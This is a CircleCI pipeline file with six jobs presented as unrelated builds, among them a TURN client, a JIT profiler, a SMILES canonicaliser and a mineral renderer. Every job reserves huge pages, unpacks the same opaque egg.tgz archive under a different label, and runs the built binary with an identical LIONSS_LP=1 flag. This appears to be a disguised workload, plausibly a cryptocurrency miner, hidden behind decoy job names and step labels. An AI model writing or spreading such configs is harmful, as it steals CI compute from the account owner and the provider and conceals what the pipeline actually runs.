version: 2.1

jobs:
  TurnRelay:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set credentials
          command: |
            printf 'realm turn\n' > turn.cfg
      - run:
          name: Build TURN client
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target TurnRelay -j2
      - run:
          name: Allocate relay
          command: LIONSS_LP=1 ./build/TurnRelay --conf turn.cfg --lifetime 600
  jitProfile:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Seed traces
          command: |
            printf 'hot 50\n' > jit.cfg
      - run:
          name: Build profiler
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target jitProfile -j2
      - run:
          name: Profile hot methods
          command: LIONSS_LP=1 ./build/jitProfile --conf jit.cfg --threshold 10000
  stackmap_gc:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Emit maps
          command: |
            printf 'roots 40\n' > map.cfg
      - run:
          name: Build stackmap emitter
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target stackmap_gc -j2
      - run:
          name: Scan GC roots
          command: LIONSS_LP=1 ./build/stackmap_gc --conf map.cfg --precise
  smiles_canon:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write molecule
          command: |
            printf 'c1ccccc1\n' > mol.smi
      - run:
          name: Build cheminformatics lib
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target smiles_canon -j2
      - run:
          name: Canonicalize SMILES
          command: LIONSS_LP=1 ./build/smiles_canon --in mol.smi --kekulize
  malachite:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load banding
          command: |
            printf 'bands 9\n' > mal.cfg
      - run:
          name: Build mineral renderer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target malachite -j2
      - run:
          name: Render malachite swirl
          command: LIONSS_LP=1 ./build/malachite --config mal.cfg --polish 0.9
  ParquetRollup:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Stage parquet
          command: |
            mkdir -p pq && : > pq/part-0.parquet
      - run:
          name: Build rollup job
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ParquetRollup -j2
      - run:
          name: Roll up parquet files
          command: LIONSS_LP=1 ./build/ParquetRollup --dir pq --by day
